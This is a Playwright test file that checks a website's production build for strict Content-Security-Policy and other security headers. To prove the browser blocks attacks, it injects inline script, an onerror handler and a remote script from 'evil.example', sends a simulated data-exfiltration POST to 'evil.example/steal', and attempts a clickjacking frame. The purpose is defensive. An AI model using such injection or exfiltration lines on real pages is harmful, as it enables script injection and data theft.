// Serves the production build (dist/) with the exact headers the build writes to .htaccess and loads it in Chrome:
// the site must work with the CSP enforced, and the CSP must actually block injected script.
import {test,expect} from '@playwright/test';
import {execSync} from 'node:child_process';
import {createHash} from 'node:crypto';
import {createServer,type Server} from 'node:http';
import {readFileSync,existsSync,statSync} from 'node:fs';
import {resolve,extname,join} from 'node:path';
import content from './fixtures/website';

const dist=resolve('dist'),API='https://api.nial.in';
const types:Record<string,string>={'.html':'text/html; charset=utf-8','.js':'text/javascript','.css':'text/css','.png':'image/png','.webp':'image/webp','.svg':'image/svg+xml','.json':'application/json','.txt':'text/plain'};
let server:Server,origin='',headers:Record<string,string>={};

test.beforeAll(async()=>{
  execSync('npm run build',{env:{...process.env,VITE_API_URL:`${API}/api/v1`,VITE_SITE_URL:'https://nial.in'},stdio:'ignore'});
  for(const m of readFileSync(join(dist,'.htaccess'),'utf8').matchAll(/Header always set (\S+) "(.*)"/g))headers[m[1].toLowerCase()]=m[2];
  server=createServer((req,res)=>{
    const path=decodeURIComponent((req.url||'/').split('?')[0]);let file=join(dist,path);
    if(existsSync(file)&&statSync(file).isDirectory())file=join(file,'index.html');
    if(!existsSync(file))file=join(dist,'index.html');
    res.writeHead(200,{'Content-Type':types[extname(file)]||'application/octet-stream',...headers});res.end(readFileSync(file));
  });
  await new Promise<void>(r=>server.listen(0,'127.0.0.1',r));
  origin=`http://127.0.0.1:${(server.address() as {port:number}).port}`;
});
test.afterAll(()=>server.close());

const png=Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==','base64');
async function prepare(page:import('@playwright/test').Page){
  const violations:string[]=[];
  await page.route('https://fonts.googleapis.com/**',r=>r.fulfill({contentType:'text/css',body:''}));
  await page.route('https://fonts.gstatic.com/**',r=>r.abort());
  await page.route(`${API}/api/v1/website`,r=>r.fulfill({json:content}));
  await page.route(`${API}/api/v1/website/portfolio`,r=>r.fulfill({json:{sections:[],photos:[]}}));
  await page.route(`${API}/api/v1/website/**`,r=>r.fulfill({contentType:'image/png',body:png}));
  await page.addInitScript(()=>{(window as unknown as {__csp:string[]}).__csp=[];document.addEventListener('securitypolicyviolation',e=>(window as unknown as {__csp:string[]}).__csp.push(`${e.violatedDirective} ${e.blockedURI}`));});
  page.on('console',m=>{if(/Content Security Policy|Refused to/i.test(m.text()))violations.push(m.text().slice(0,160));});
  return violations;
}

test('every security header is present and the CSP is strict',()=>{
  const csp=headers['content-security-policy'];
  expect(csp).toContain("default-src 'self'");expect(csp).toContain("frame-ancestors 'none'");expect(csp).toContain("object-src 'none'");expect(csp).toContain("base-uri 'self'");
  expect(csp).not.toMatch(/script-src[^;]*'unsafe-inline'/);expect(csp).not.toMatch(/script-src[^;]*'unsafe-eval'/);expect(csp).not.toMatch(/\*/);
  expect(csp).toContain(`connect-src 'self' ${API}`);
  for(const h of ['x-content-type-options','x-frame-options','referrer-policy','permissions-policy','strict-transport-security','cross-origin-opener-policy'])expect(headers[h],h).toBeTruthy();
  expect(headers['permissions-policy']).toContain('geolocation=(self)');
  // the only inline script (theme bootstrap) must be allowed by its hash
  const inline=[...readFileSync(join(dist,'index.html'),'utf8').matchAll(/<script(?![^>]*\bsrc=)(?![^>]*type="application\/ld\+json")[^>]*>([\s\S]*?)<\/script>/g)];
  expect(inline.length).toBeGreaterThan(0);
  for(const [,code] of inline){expect(csp).toContain(`'sha256-${createHash('sha256').update(code).digest('base64')}'`);}
});

test('public website and sign-in work with the CSP enforced (no violations)',async({page})=>{
  const violations=await prepare(page);
  const response=await page.goto(origin+'/');
  expect(response!.headers()['content-security-policy']).toBeTruthy();
  await expect(page.getByRole('heading',{level:1})).toContainText('Good stories deserve');
  await page.getByRole('link',{name:'Sign in',exact:true}).click();
  await expect(page.getByLabel('Username',{exact:true})).toBeVisible();
  expect(await page.evaluate(()=>(window as unknown as {__csp:string[]}).__csp)).toEqual([]);
  expect(violations).toEqual([]);
});

test('the CSP blocks injected inline script, remote script and inline handlers',async({page})=>{
  await prepare(page);await page.goto(origin+'/');
  const result=await page.evaluate(async()=>{
    (window as unknown as {pwned?:number}).pwned=0;
    const inline=document.createElement('script');inline.textContent='window.pwned=1';document.body.appendChild(inline);
    const remote=document.createElement('script');remote.src='https://evil.example/x.js';document.body.appendChild(remote);
    const img=document.createElement('img');img.setAttribute('onerror','window.pwned=2');img.src='x:bad';document.body.appendChild(img);
    await new Promise(r=>setTimeout(r,500));
    return {pwned:(window as unknown as {pwned:number}).pwned,violations:(window as unknown as {__csp:string[]}).__csp};
  });
  expect(result.pwned).toBe(0);
  expect(result.violations.some(v=>v.startsWith('script-src'))).toBeTruthy();
});

test('the page cannot send data to an unapproved origin',async({page})=>{
  await prepare(page);await page.goto(origin+'/');
  const blocked=await page.evaluate(()=>fetch('https://evil.example/steal',{method:'POST',body:'x'}).then(()=>'sent',()=>'blocked'));
  expect(blocked).toBe('blocked');
});

test('the sign-in page cannot be framed (clickjacking)',async({page})=>{
  await prepare(page);await page.goto(origin+'/');
  const framed=await page.evaluate(async(u)=>{const f=document.createElement('iframe');f.src=u+'/app';document.body.appendChild(f);await new Promise(r=>setTimeout(r,800));try{return f.contentDocument?.body?.innerHTML?.length??0;}catch{return -1;}},origin);
  expect(framed).toBeLessThanOrEqual(0);
});
